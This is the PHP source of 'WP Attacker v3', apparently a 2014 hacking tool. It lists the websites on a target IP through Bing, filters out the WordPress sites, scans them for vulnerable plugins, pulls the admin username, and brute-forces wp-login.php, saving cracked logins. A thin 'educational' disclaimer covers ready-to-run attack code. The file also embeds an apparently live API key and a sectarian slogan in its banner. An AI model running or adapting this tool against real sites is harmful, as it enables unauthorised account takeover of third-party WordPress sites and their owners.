<?php
/*
    
    
              ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗     ██╗  ██╗██████╗ 
             ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗    ╚██╗██╔╝██╔══██╗
             ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝     ╚███╔╝ ██████╔╝
             ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝      ██╔██╗ ██╔═══╝ 
             ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║         ██╔╝ ██╗██║     
              ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚═╝ ALM3REFH.COM 
    
    
    ██╗    ██╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██║    ██║██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║ █╗ ██║██████╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
    ██║███╗██║██╔═══╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║         ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ THIRD VERSION
    
    WP Attacker v3 © Group XP 2014
    
    Coder : Hannibal Ksa (@r00t3rz)
    Home  : alm3refh.com
    
    What's WP Attacker:
    - Scan the server's websites, and filter the ones that are using WorePress (Using Bing search engin [API]).
    - Get All the possible plugins and themese, which are vulnerable (Using a list).
    - BruteForce each website that uses Wordpress (Using a correct username and a passwords list). *NEW* *BETA*
    - Get All the possible plugins, which are vulnerable (Using security dbs). *NEW* *BETA*
    - Exploit 'em (With the vulnerable that has been found). *UNDERGROUND*
    
    Why WP Attacker?
    - Using Bing API, Which leads to faster & guaranteed responde.
    - User can use his own 0day exploits.
    - List can be updated by the user.
    - Simple and easy.
    
    # In a simple word, it is an "Automatic WP Exploiter".
    
    Disclaimer:
    - THIS TOOL WAS WRITTEN FOR EDUCATIONAL PURPOSES. ONLY USE THIS TOOL ON WEBSITES YOU ARE ALLOWED TO TEST
    - THE AUTHOR CANNOT AND WILL NOT IN ANY WAY LIABLE FOR ANY LOSS OR DAMAGE ARISING WITH THE USE OF THIS TOOL.
    - USE IT UNDER YOUR OWN RISK!
    - IF YOU DON'T AGREE WITH WHAT I SAID, PLEASE DON'T USE THIS TOOL.
    
    Thanks and enjoy.
    
    And stay tuned!
    Best regards, Ali (aka Hannibal Ksa).
    
*/
error_reporting(0);
function clear(){
    ##########################
    ##   CLEAN THE SCREEN   ##
    ####################################################
    ##  FIXED TO BE ABLE TO WORK ON OSX AND OTHER OS  ##
    ####################################################
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { #strtolower(PHP_SHLIB_SUFFIX) === 'dll'
        @system('cls'); # Windows
    } else { # DIRECTORY_SEPARATOR == '\\'
        @system('clear'); # Linux/UNIX/OS X
    }
}
function banner(){
    ##########################################################
    ##    BANNERS/COPYRIGHTS  R00T3RZ.COM & ALM3REFH.COM    ##
    ##   REMOVING THIS WILL ONLY MAKES YOU A "DOUCHEBAG!"   ##
    ##########################################################
    ####################
    ##  FIRST BANNER  ##
    ####################
    $bannerone = "\n\t  _      _____    ___ _______________  _______ _________";
    $bannerone .="\n\t | | /| / / _ \  / _ /_  __/_  __/ _ |/ ___/ //_/ __/ _ \\";
    $bannerone .="\n\t | |/ |/ / ___/ / __ |/ /   / / / __ / /__/ ,< / _// , _/";
    $bannerone .="\n\t |__/|__/_/    /_/ |_/_/   /_/ /_/ |_\___/_/|_/___/_/|_| \n";
    $bannerone .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
    #####################
    ##  SECOND BANNER  ##
    #####################
    $bannertwo = "\n\t           (                                              ";
    $bannertwo .="\n\t (  (      )\ )     (        )   )            )           ";
    $bannertwo .="\n\t )\))(   '(()/(     )\    ( /(( /(   )     ( /(   (  (    ";
    $bannertwo .="\n\t((_)()\ )  /(_)) ((((_)(  )\())\()| /(  (  )\()) ))\ )(   ";
    $bannertwo .="\n\t_(())\_)()(_))    )\ _ )\(_))(_))/)(_)) )\((_)\ /((_|()\  ";
    $bannertwo .="\n\t\ \((_)/ /| _ \   (_)_\(_) |_| |_((_)_ ((_) |(_|_))  ((_) ";
    $bannertwo .="\n\t \ \/\/ / |  _/    / _ \ |  _|  _/ _` / _|| / // -_)| '_| ";
    $bannertwo .="\n\t  \_/\_/  |_|     /_/ \_\ \__|\__\__,_\__||_\_\\\\___||_|   \n";
    $bannertwo .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
    ####################
    ##  THIRD BANNER  ##
    ####################
    $bannerthr = "\n\t _ _ _ _____    _____ _   _           _           ";
    $bannerthr .="\n\t| | | |  _  |  |  _  | |_| |_ ___ ___| |_ ___ ___ ";
    $bannerthr .="\n\t| | | |   __|  |     |  _|  _| .'|  _| '_| -_|  _|";
    $bannerthr .="\n\t|_____|__|     |__|__|_| |_| |__,|___|_,_|___|_|  \n";
    $bannerthr .="\n\t\t WP Attacker v3 - By Hannibal Ksa\n\n\n";
    #####################
    ##  FOURTH BANNER  ##
    #####################
    $bannerfor = "\n\t _    _______    ___  _   _             _             ";
    $bannerfor .="\n\t| |  | | ___ \  / _ \| | | |           | |            ";
    $bannerfor .="\n\t| |  | | |_/ / / /_\ \ |_| |_ __ _  ___| | _____ _ __ ";
    $bannerfor .="\n\t| |/\| |  __/  |  _  | __| __/ _` |/ __| |/ / _ \ '__|";
    $bannerfor .="\n\t\  /\  / |     | | | | |_| || (_| | (__|   <  __/ |   ";
    $bannerfor .="\n\t \/  \/\_|     \_| |_/\__|\__\__,_|\___|_|\_\___|_|   \n";
    $bannerfor .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
    ####################
    ##  FIFTH BANNER  ##
    ####################
    $bannerfiv = "\n\t██╗    ██╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ";
    $bannerfiv .="\n\t██║    ██║██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗";
    $bannerfiv .="\n\t██║ █╗ ██║██████╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝";
    $bannerfiv .="\n\t██║███╗██║██╔═══╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗";
    $bannerfiv .="\n\t╚███╔███╔╝██║         ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║";
    $bannerfiv .="\n\t ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n";
    $bannerfiv .="\t\t\t\t WP Attacker v3 - By Hannibal Ksa\n\n\n";
    #########################################
    ##   GET A RANDOME BANNER & PRINT IT   ##
    ##         METASPLOIT SWAG :-P         ##
    #########################################
    $banner = array($bannerone, $bannertwo, $bannerthr, $bannerfor, $bannerfiv);
    print $banner[array_rand($banner)];
}
function noblackhat(){
    ##################
    ##  DISCLAIMER  ##
    ##################
    print "\n\t ______________________________________________";
    print "\n\t|    ____                        __  ______    |";
    print "\n\t|   / ___|_ __ ___  _   _ _ __   \ \/ /  _ \   |";
    print "\n\t|  | |  _| '__/ _ \| | | | '_ \   \  /| |_) |  |";
    print "\n\t|  | |_| | | | (_) | |_| | |_) |  /  \|  __/   |";
    print "\n\t|   \____|_|  \___/ \__,_| .__/  /_/\_\_|      |";
    print "\n\t|                        |_|ALM3REFH.com       |";
    print "\n\t|                                              |";
    print "\n\t+----------------------------------------------+";
    print "\n\t|       WP Attacker v3 - By Hannibal Ksa       |";
    print "\n\t+----------------------------------------------+\n\n";
    print "\n\t\t    !! NO SHIA / ONLY SUNNAH !!\n\n";
    ###########################
    ##  5 SECONDS DISCLAIMER ##
    ###########################
    print "\n\n\tThis tool may be used for legal purposes only.  Users take full
\tresponsibility for any actions performed using this tool.            
\tWP-ATTACKER comes with ABSOLUTELY NO WARRANTY!                             
\tIf these terms are not acceptable to you, then do not use this tool.
\n\tPlease Read! Continuing in 5 seconds ";
    sleep(1);print ".";sleep(1);print ".";sleep(1);print ".";sleep(1);print ".";sleep(1);print ".";sleep(1);print ". ";
    print "\n\n\n\n";
}
function bing_it($hk){
    ##################
    ##   BING API   ##
    ###########################################################################
    ##   REPLACE [ $account_key ] VALUE WITH YOUR [ BING API ACCOUNT KEY ]   ##
    ##  MORE INFO [ https://datamarket.azure.com/dataset/bing/search ]       ##
    ###########################################################################
    $account_key = 'FvQNhc+xEFUlSM7nMCqy7U627Oi4MiAnwK+X/oWhPGk';
    $query = $hk;
    $url = "https://api.datamarket.azure.com/Bing/Search/v1/Web?Query=".urlencode("'$query'")."&\$format=json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT,true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    curl_setopt($ch, CURLOPT_USERPWD, $account_key . ":" . $account_key);
    $json = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($json);
    foreach ($data->d->results as $value) {
        $file = fopen("sites.txt","a+");
        fwrite($file,"{$value->DisplayUrl}\n");
        fclose($file);
    }
}
function wp($list){
    ########################################
    ##   CHECK IF IS BUILT ON WORDPRESS   ##
    ########################################
    $file = file_get_contents($list);
    $get = explode('\n', $file);
    foreach($get as $site){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $site);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
        $result = curl_exec($ch);
        curl_exec($ch);
        curl_close($ch);
        if(preg_match("#wp-content#", $result) or preg_match("/wp-includes/", $result)){
            $filename = 'wp-sites.txt';
            $fp = fopen($filename, "a+");
            $write = fputs($fp, $site."\n");
            fclose($fp);
        }
    }
    $lines = file('wp-sites.txt');
    $lines = array_unique($lines);
    file_put_contents('wp-sites.txt', implode($lines));
}
function wp_em($list){
    ###############################
    ##   MAKE'EM CRYSTAL CLEAR   ##
    ###############################
    $file = file_get_contents($list);
    $get = explode("\n", $file);
    foreach($get as $wpsite){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $wpsite);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
        $result = curl_exec($ch);
        curl_exec($ch);
        curl_close($ch);
        preg_match('|<link rel="pingback" href="(.*?)" />|', $result, $url);
        $wpurl = str_replace("xmlrpc.php","",$url[1]);
        $filename = 'wp.txt';
        $fp = fopen($filename, "a+");
        $write = fputs($fp, $wpurl."\n");
        fclose($fp);
    }
    $lines = file('wp.txt');
    $lines = array_unique($lines);
    file_put_contents('wp.txt', implode($lines));
}
function xp_scanner($target,$list){
    ##########################################################
    ##   PLUGINS AND THEMESE SCANNER PULBLIC/FIRST VERSION  ##
    ##########################################################
    ##  LIST FORMAT:  NAME:PATH:KEYWORD                     ##
    ##  EXAMPLE:  xp:wp-content/plugins/xp/xp.php:Group-XP  ##
    ##########################################################
    $file = file_get_contents($list);
    $plugins = explode("\n", $file);
    #print "\n\n[ Testing $target with ".count($plugins)." Plugins/Themes ]\n";
    foreach($plugins as $plugin){
        /*
        #####################
        ##   GET HEADERS   ##
        #####################
        $target = $target.'/'.$x[1];
        $check = @get_headers($target);
        if(@preg_match("/OK/",$check[0]))  {
            print "\n\t[!] FOUND $x[0] -> $target";
        }
        */
        $x = explode(":", $plugin);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target.'/'.$x[1]);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
        $result = curl_exec($ch);
        curl_exec($ch);
        curl_close($ch);
        #if(!preg_match("404", $result) or !preg_match("not found", $result)){
        if(preg_match("#".$x[2]."#", $result)){
            ####################
            ##  PLUGIN FOUND  ##
            ####################
            print "\n\t[!] FOUND $x[0] -> $target";
            /*
            #############
            ## SAVE IT ##
            #############
            $data = $target." -> ".$x[0]."\n";
            $filename = 'vuln.txt';
            $fp = fopen($filename, "a+");
            $write = fputs($fp, $data);
            fclose($fp);
            */
        } #else { print "\n\t[-] NOT FOUND $x[0] -> $target"; }
    }
}
function xp_get_plugins($target){
    #########################
    ##   GET ALL PLUGINS   ##
    #########################
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
    $result = curl_exec($ch);
    curl_exec($ch);
    curl_close($ch);
    preg_match_all("#/plugins/(.*?)/#i", $result, $plugin);
    $plugins = array_unique($plugin[1]);
    #if(count($plugins)==0){
    #    print "No Plugin was found.";
    #}
    foreach($plugins as $found){
        #print "\n\n$plugin\n\n";
        #################
        ##  SEARCH IT  ##
        #################
        xp_scanner_db($target, $found);
    }
}
function xp_scanner_db($target, $plugin){
    #######################################################################
    ##   PLUGINS SCANNER USING ONLINE SECURITY DBS FIRST/PUBLIC VERSION  ##
    #######################################################################
    ##  THIS VERSION ONLY CHECKS  ##
    ## - WORDPRESSEXPLOIT.COM     ##
    ## - EXPLOIT-DB.COM     ##
    ################################
    $wpexploit = "http://www.wordpressexploit.com/";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $wpexploit);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
    $result = curl_exec($ch);
    curl_exec($ch);
    curl_close($ch);
    if(preg_match("#$plugin#", $result)){
        ##############
        ##  GOTCHA  ##
        ##############
        //print "\n\t$target -> seems to has a vulnerability plugin which is $plugin\n";
        ###############
        ##  SAVE IT  ##
        ###############
        $data = "\n[!] $target -> seems to has a vulnerability plugin which is [ $plugin ]";
        $filename = 'vulpl.txt';
        $fp = fopen($filename, "a+");
        $write = fputs($fp, $data."\n");
        fclose($fp);
    }
}
function xp_get_user($target,$list){
    ####################################
    ##     GET WORDPRESS USERNAME     ##
    ##  A SIMPLE ONE BUT WOTH A SHOT  ##
    ####################################
    $user = trim(($target))."/?author=1";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $user);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
    $result = curl_exec($ch);
    curl_exec($ch);
    curl_close($ch);
    preg_match('|<title>(.*?)<\/title>|', $result, $username);
    $account = explode('|', $username[1]);
    ################################################
    ##  START BRUTE FORCE WITH THE ADMIN ACCOUNT  ##
    ################################################
    return xp_brute($target,$account,$list);
}
function xp_brute($target,$user,$list){
    ###########################################
    ##   BRUTE FORCE PULBLIC/FIRST VERSION   ##
    ###########################################
    ##  PASSWORDS LIST FORMAT:  PASSWORD\n   ##
    ##  EXAMPLE:  12345\np4ssw0rd            ##
    ##  ( \n = NEW LINE )                    ##
    ###########################################
    $file = file_get_contents($list);
    $passwords = explode("\n", $file);
    print "\n\n[ Testing $target ($user) with (".count($passwords).") Passwords ]\n";
    foreach($passwords as $password){
        $target = trim($target);
        $password = trim($password);
        $user = trim($user);
        #############################
        ##  TESTING EACH PASSWORD  ##
        #############################
        $curl = curl_init();
        curl_setopt($curl,CURLOPT_URL, $target."/wp-login.php");
        curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./wp-cookie.txt");
        curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./wp-cookie.txt");
        curl_setopt($curl,CURLOPT_POSTFIELDS, "log=$user&pwd=$password&wp-submit=Log+In&redirect_to=./wp-admin/&testcookie=1");
        $result = curl_exec($curl);
        ##########################
        ##  CHECK IF IT WORKED  ##
        ##########################
        if(preg_match('/<div id="screen-meta" class="metabox-prefs">/', $result)){
            print "\n\n\t[!] Cracked $target -> [ $user:$password ]\n\n";
            ###############
            ##  SAVE IT  ##
            ###############
            $data = "\n[!] Cracked $target -> [ $user:$password ]";
            $filename = 'cracked.txt';
            $fp = fopen($filename, "a+");
            $write = fputs($fp, $data."\n");
            fclose($fp);
            break;
        }
    }
}
function bye(){
    ########################
    ##  DONE/SAY GOODBYE  ##
    ########################
    print "\n\n[+] DONE!\n[-] EXITING.\n\n";
    ######################
    ## DELETE LOG FILES ##
    ###################################################################
    ## NOTE: YOU CAN REMOVE THIS TO HAVE MORE INFO ABOUT THE TARGET! ##
    ###################################################################
    unlink('sites.txt');
    unlink('wp-sites.txt');
    unlink('wp.txt');
    unlink('vuln.txt');
    unlink('cracked.txt');
    exit(2);
}
############################
##  COMMAND LINE'S  SHIT  ##
############################
clear();
noblackhat();
################################################
##  MAKE SURE IT RUNS ONLY FROM COMMAND LINE  ##
################################################
if( strtolower(php_sapi_name()) != 'cli' ) {
    printf("%s\n", "Please run only from command line interface.");
    exit;
}
clear();
banner();
print "\nIP-Address # ";
$target = trim(fgets(STDIN));
// if(!filter_var($targte, FILTER_VALIDATE_IP)){ die("\nError: Not a valid IP.\n\n"); }
##############################
##   DELETE OLD LOG FILES   ##
##############################
unlink('sites.txt');
unlink('wp-sites.txt');
unlink('wp.txt');
unlink('vuln.txt');
unlink('cracked.txt');
unlink('vulpl.txt');
#############################
##   CREAT THE LOG FILES   ##
#############################
$log1 = fopen("sites.txt","w");fclose($log1);
$log2 = fopen("wp-sites.txt","w");fclose($log2);
$log3 = fopen("wp.txt","w");fclose($log3);
$log4 = fopen("vuln.txt","w");fclose($log4);
$log4 = fopen("cracked.txt","w");fclose($log4);
$log5 = fopen("vulpl.txt","w");fclose($log5);
###############################
##  SHIT IS GETTIN' REAL =P  ##
###############################
print "\nDORK [or simply leave it empty] # ";
$dork = trim(fgets(STDIN));
print "\n[+] Getting the server's sites";
if($dork == ""){
    #########################
    ##  IF DORK WAS EMPTY  ##
    #########################
    bing_it("ip:$target");
    bing_it("ip:".$target." /page_id=");
    bing_it("ip:".$target." Wordpress");
    bing_it("ip:".$target." blog");
}else{
    ###########################
    ##  USE THE USER'S DORK  ##
    ###########################
    bing_it("ip:".$target." ".$dork);
}
#print "\n[-] Got'em";sleep(1);
print "\n[+] Separating the sites";
wp('sites.txt');
#print "\n[-] We got the sites, which are using WordPress";sleep(1);
wp_em('wp-sites.txt');
#################
##   Results   ##
#################
print "\n[+] Finished, these are the website/s that I found:\n";
$wplist = file_get_contents('wp.txt');
$get = explode("\n", $wplist);
#print "[ ".count($get)." Website ]\n"; // empty lines will be counted
foreach($get as $hk){
    if(!$hk==""){
        print "\n\t[!] $hk";
    }
}
###########################
##   GIVE ME AN OPTION   ##
###########################
print "\n\n\n[1] PLUGINS/THEMES SCANNER. (FROM A LIST)\n[2] PLUGINS SCANNER. (FROM A SECURITY DBS)\n[3] BRUTE FORCE.\n[4] EXIT/QUIT.\n\n";
print "\nWHAT WOULD YOU LIKE TO DO ? [1,2,3] : ";
$what = trim(fgets(STDIN));
$choice = array("1","2","3","4");
if(in_array($what, $choice)){
    if($what == "1"){
        print "\nNP, WHERE IS YOUR LIST FOR PLUGINS/THEMES? [ex: hk.txt] : ";
        $list = trim(fgets(STDIN));
        if(!is_file($list)) {
            #######################
            ##  CAN'T LOAD LIST  ##
            #######################
            print "\nERROR! WHILE LOADING THE LIST FILE\n\n";
            ##############
            ##   EXIT   ##
            ##############
            bye();
        }
        #################
        ##   POOYAA!   ##
        #################
        print "\n[+] Scanning begun";
        $file = file_get_contents($list);
        $plugins = explode("\n", $file);
        print "\n[-] [".count($plugins)."] Plugins/Themes have been loaded\n";
        $targets = file_get_contents('wp.txt');
        $r00t3rz = explode("\n", $targets);
        foreach($r00t3rz as $z){
            if(!$z == ""){
                xp_scanner($z, $list);
            }
        }
        /*
        #################
        ##   Results   ##
        #################
        print "\n[+] Scanning finished!";
        $vul = file_get_contents('vuln.txt');
        $able = explode("\n", $vul);
        print '[ '.count($able).' Website ]\n';
        foreach($able as $gxp){
            if(!$gxp==""){
                print "\n\t[!] $gxp";
            }
        }
        */
        bye();
    } elseif($what == "2") {
        print "\nPLUGINS SCANNER USING ONLINE SECURITY DBS\n\n";
        #################
        ##   POOYAA!   ##
        #################
        print "\n[+] Scanning begun";
        $targets = file_get_contents('wp.txt');
        $r00t3rz = explode("\n", $targets);
        foreach($r00t3rz as $z){
            if(!$z == ""){
                xp_get_plugins($z);
            }
        }
        #################
        ##   Results   ##
        #################
        print "\n[+] Finished, these are the websites have a vulnerability plugin/s:\n";
        $vulpl = file_get_contents('vulpl.txt');
        $getpl = explode("\n", $vulpl);
        #print "[ ".count($get)." Website ]\n"; // empty lines will be counted
        foreach($getpl as $vul){
            if(!$vul==""){
                print "\n\t$vul";
            }
        }
        bye();
    } elseif($what == "3") {
        print "\nNP, WHERE IS YOUR PASSWORS LIST? [ex: hk.txt] : ";
        $list = trim(fgets(STDIN));
        if(!is_file($list)) {
            #######################
            ##  CAN'T LOAD LIST  ##
            #######################
            print "\nERROR! WHILE LOADING THE LIST FILE\n\n";
            ##############
            ##   EXIT   ##
            ##############
            bye();
        }
        #################
        ##   POOYAA!   ##
        #################
        print "\n[+] Bruting begun";
        $targets = file_get_contents('wp.txt');
        $xp = explode("\n", $targets);
        foreach($xp as $z){
            if(!$z == ""){
                xp_get_user($z, $list);
            }
        }
        bye();
    } else {
        ######################
        ##  OOH KILL'EM =P  ##
        ######################
        bye(); 
    }
}
#####################################
##  © ALM3REFH.COM 2014 - CHEERS!  ##
#####################################
?>
